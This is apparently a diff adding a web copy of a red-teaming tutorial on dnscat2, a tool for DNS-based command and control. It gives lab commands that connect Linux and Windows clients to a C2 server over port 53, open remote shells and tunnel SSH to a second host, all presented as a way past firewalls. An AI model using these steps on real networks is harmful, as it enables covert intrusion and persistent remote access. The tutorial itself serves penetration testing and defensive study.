@@ -1,0 +1,89 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/red-teaming/" rel="category tag">Red Teaming</a></span>            </div>
+            <h1 class="post-title entry-title">DNScat2: Application Layer C&amp;C</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/dnscat2-application-layer-cc/" rel="bookmark"><time class="entry-date published" datetime="2020-11-18T13:06:19+00:00">November 18, 2020</time><time class="updated" datetime="2025-05-10T20:53:43+00:00">May 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">In this guide, we explore <strong data-start="755" data-end="786">DNScat2 Application Layer Command and Control</strong>, a method for using DNS to establish covert communication channels. By setting up DNScat2, security professionals can create a tunnel over port 53, allowing encrypted data transmission and remote access while bypassing firewalls.</span></p>
+<p><span style="color: #000000;">In today’s world, IT infrastructure and network security devices are becoming more and more secure and hence, ports like 53 (DNS) is used as a communication channel between a client and a C2 server. In highly restricted environments, DNS always resolves domains. So, to serve our penetration testing purpose we might require a tool that can create reverse connections on port 53 and perform DNS tunnelling when necessary. In comes, dnscat2.</span></p>
+<h3><span style="color: #800000;">Table of Content</span></h3>
+<ul>
+<li><span style="color: #000000;">Introduction to DNS</span></li>
+<li><span style="color: #000000;">Introduction to DNScat</span></li>
+<li><span style="color: #000000;">Installation</span></li>
+<li><span style="color: #000000;">DNS tunnelling</span></li>
+<li><span style="color: #000000;">Conclusion</span></li>
+</ul>
+<h3><span style="color: #800000;">Introduction to DNS</span></h3>
+<p><span style="color: #000000;">The Domain Name System (DNS) associate’s URLs with their IP address. With DNS, it’s conceivable to type words rather than a series of numbers into a browser, enabling individuals to look for sites and send messages utilizing commonplace names. When you look for the domain name in a browser, it sends a question over to the DNS server to coordinate the domain with its IP. When found, it utilizes the IP to recover the site’s content. Most astonishingly, this entire procedure takes just milliseconds. For all this working, it uses port 53.</span></p>
+<h3><span style="color: #800000;">Introduction to DNScat</span></h3>
+<p><span style="color: #000000;">DNScat is a praised tool because it creates a command and control tunnel over the DNS protocol. This tunnel allows an attacker to work in stealth mode. You can access any data, upload and download files, and even get a shell. For this tool to work over port 53, you don’t need to have authoritative access to the DNS server. Instead, you can simply establish your connection over port 53. It will work faster and still be perceived as normal traffic. However, it makes its presence clearly visible in the packet log.</span></p>
+<h4 data-start="641" data-end="689"><span style="color: #000000;">DNScat Architecture: Client and Server Roles</span></h4>
+<p><span style="color: #000000;">DNScat consists of two components: a server and a client. To understand how DNScat works, you need to examine both components individually.</span></p>
+<p class="" data-start="252" data-end="585"><span style="color: #000000;">You run the client on a target machine. It is written in C and requires minimal prerequisites. When you run the client, you typically specify a domain name. The client sends all packets to the local DNS server. That server then forwards the packets to the legitimate DNS server for the specified domain, which you presumably control.</span></p>
+<p class="" data-start="587" data-end="1040"><span style="color: #000000;">You run the server on an authoritative DNS server. It is developed in Ruby and depends on several specific Ruby gems. Like the client, the server also requires you to specify which domain(s) it will monitor over port 53. When the server receives traffic for one of those domains, it attempts to establish a valid connection. If it receives unrelated traffic, it automatically discards it. However, it can also forward such traffic upstream if necessary.</span></p>
+<h3><span style="color: #800000;">Installation</span></h3>
+<p><span style="color: #000000;">Run the following git command to download dnscat2:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">git clone https://github.com/iagox86/dnscat2.git</pre>
+<p><span style="color: #000000;"><img fetchpriority="high" decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-V0iNrdbhhwo/X7UYos49gjI/AAAAAAAAqxU/m8axYxGoSDc97zhp4QNqAUwPurLB9G0DgCLcBGAsYHQ/s16000/1.png" alt="DNScat2 Application Layer Command and Control" width="566" height="116"/></span></p>
+<p><span style="color: #000000;">Now install bundler as it is a major dependency for dnscat2. To install bundler go into the server of dnscat2 and type:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">gem install bundler 
+bundle install</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-YVmT4urOmHc/X7UZZ306j_I/AAAAAAAAqxc/-ic5juHKkYUcM80wqvSiJ4uesGchzwxQgCLcBGAsYHQ/s16000/2.png"/></span></p>
+<p><span style="color: #000000;">Once everything is done, the server will run with the following command:</span></p>
+<p><span style="color: #000000;"><img decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-TBbIIVbFfTg/X7UZheeYkvI/AAAAAAAAqxg/_GJlKp2BtWY17orbqsoY_YcavHDe96iSACLcBGAsYHQ/s16000/3.png" alt="DNScat2 Application Layer Command and Control" width="671" height="403"/></span></p>
+<p><span style="color: #000000;">Similarly, download dnscat2 in the client machine too. And use make command to compile it with the server, as shown in the image below:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">git clone https://github.com/iagox86/dnscat2.git 
+cd dnscat2/ 
+cd client/ 
+make</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Zwg9OXq5B_U/X7UZnQIU8eI/AAAAAAAAqxk/dHMETq9YZqkvITzNxZ4pg0Z2SkYWOvtzQCLcBGAsYHQ/s16000/4.png"/></span></p>
+<p><span style="color: #000000;">To establish a connection between client and server, use the following command:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">./dnscat --dns=server=192.168.0.102,port=53</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Qgc04WylNgg/X7UZtfNUW6I/AAAAAAAAqxs/6Tg-a1qtcmYuqrI4nDrx1mcwxyexJINowCLcBGAsYHQ/s16000/5.png"/></span></p>
+<p><span style="color: #000000;">You can check the successful creation of the session in Wireshark too. In real life scenario, port 53 plays a huge role in getting reverse shell because port 53 is seldom blocked in security devices and plus in scenarios where a system hosts more than one NIC cards, traffic of both the cards travels through a single DNS.</span></p>
+<p><span style="color: #000000;"><img decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-x2CBEoxeAMA/X7UZ2gw-9FI/AAAAAAAAqx0/cXd2ZQ2enjs-yyOGxHck5tOfs8PLXH4JwCLcBGAsYHQ/s16000/6.png" alt="DNScat2 Application Layer Command and Control" width="704" height="287"/></span></p>
+<p><span style="color: #000000;">Once the connection is established, you can see on the server-side that you will have a session as shown in the image below. You can use the command ‘sessions’ to check for a session that is created. Now, here we can play around with many options all of which are available under the ‘help’ category.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">session 
+help</pre>
+<p><span style="color: #000000;">Now, to interact with the said session type the following command:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">session -i 1</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-BgSTqeS6kjE/X7UZ7-gm65I/AAAAAAAAqx8/nX4EZd4eYbUIx7nJiqvhOPd9-zTlt2WgACLcBGAsYHQ/s16000/7.png"/></span></p>
+<p><span style="color: #000000;">We can access the session now and interact with many of the options available. Let’s try interacting with the Ubuntu system using the command:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">shell</pre>
+<p><span style="color: #000000;">Sure enough, this will create a new session 2 and upon interacting with the said session we’ll have a traditional shell.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">sessions -i 2 
+uname -a 
+ifconfig</pre>
+<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-5EXEsnjBNig/X7UaDkJRlgI/AAAAAAAAqyA/I9wUD1lvTU8TNsrUJ1K0tbCqaVNGUEn5gCLcBGAsYHQ/s16000/8.png" alt="DNScat2 Application Layer Command and Control" width="636" height="847"/></span></p>
+<h3><span style="color: #800000;">DNS Tunnelling</span></h3>
+<p><span style="color: #000000;">The important thing to note here is that the client system clearly has two NIC cards installed and the IP ranges are different in both. So, traditionally, a system present in first IP range <strong>192.168.0.0/24 </strong>won’t be able to communicate with a system present in the second IP range <strong>192.168.205.0/24</strong></span></p>
+<p><span style="color: #000000;">Here, we perform reconnaissance and found one more system on the range 192.168.205.0/24 with IP address 192.168.205.131 and forward this system’s port 22 to the client’s port 8888 to create a DNS tunnel between the two systems using the command shell we had obtained in previous steps.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-R9P3Dr2J1MM/X7UaMN68AaI/AAAAAAAAqyM/TYms4MYRk644iJoZooD8pVq8_wnQooaWQCLcBGAsYHQ/s16000/50.png"/></span></p>
+<p><span style="color: #000000;">Now, using our server, we try to log into the system with IP address <strong>192.168.205.131</strong>. Here, we know the credentials of the system at IP 192.168.205.131 so we log indirectly.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">ssh msfadmin@127.0.0.1 -p 8888</pre>
+<p><span style="color: #000000;">And as we can see, we are able to communicate with the system comfortably.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-2IwwOb8v0Mw/X7UaRVbWG3I/AAAAAAAAqyQ/wLR-fRrddmoE1mG0hklD_ZUlpWSzLmo-ACLcBGAsYHQ/s16000/51.png"/></span></p>
+<h4 data-start="1032" data-end="1084"><span style="color: #000000;">Establishing DNS Tunnel on Windows Using DNScat2</span></h4>
+<p><span style="color: #000000;"> The same can be done easily for a window’s client too. Follow the link <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://downloads.skullsecurity.org/dnscat2/">here</a> </strong></span>to download a suitable dnscat2 client for your system of windows. The latest client of dnscat for windows is marked in the snapshot below for reference.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-cH42JRW20bw/X7UaWl_h-BI/AAAAAAAAqyU/RUO8atj2DjEw5BWS6eiyikdMFiMGcViOgCLcBGAsYHQ/s16000/52.png"/></span></p>
+<p><span style="color: #000000;">We’ll perform the same steps as we did initially on the Ubuntu client while running dnscat and run the following command:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">dnscat2-v0.07-client-win32.exe --dns-server=192.168.0.102,port=53</pre>
+<p><span style="color: #000000;">And finally, we see session established status in the window. When we refresh our server’s dnscat2 console, we see a new session is created. To interact with it we use the command:</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-jkKbmr7NbHw/X7UabVlBobI/AAAAAAAAqyc/Dh48gWLtLZQedAibHRCAA842pR_D8TJ-ACLcBGAsYHQ/s16000/55.png"/></span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">session –i 1</pre>
+<p><span style="color: #000000;">Following it with the command:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">shell</pre>
+<p><span style="color: #000000;">We would see a new session is now created as in the previous case of a Linux system. We interact with it using the following command:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">sessions -i 2</pre>
+<p><span style="color: #000000;">And a brand new Windows shell gets opened!</span></p>
+<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-Pg-x4-dVREc/X7UahE-vwEI/AAAAAAAAqyk/uSg1CCvLfKA-gDRaKx1vNE7nwEMbHBkkACLcBGAsYHQ/s16000/56.png" alt="DNScat2 Application Layer Command and Control" width="572" height="882"/></span></p>
+<p>To learn about DNS Enumeration, follow this <strong><a href="https://www.hackingarticles.in/4-ways-dns-enumeration/">Link</a></strong>.</p>
+<h3><span style="color: #800000;">Conclusion</span></h3>
+<p><span style="color: #000000;">Even in the most confined situations, systems allow DNS traffic to resolve internal or external networks. This behavior creates a potential communication channel between a target host and the command and control server. The system embeds command and data inside DNS queries. Consequently, detecting such traffic becomes difficult, since arbitrary commands hide in plain sight and appear as legitimate traffic. This is exactly what DNScat takes advantage of. It uses this method to function as a successful attack tool.</span></p>
+<p><span style="color: #000000;"><strong>Author: Harshit Rajpal </strong>is an InfoSec researcher and left and right brain thinker. Contact<strong> <span style="color: #0000ff;"><a class="broken_link" style="color: #0000ff;" href="https://in.linkedin.com/in/harshit-rajpal-79bb43103">here</a></span></strong></span></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
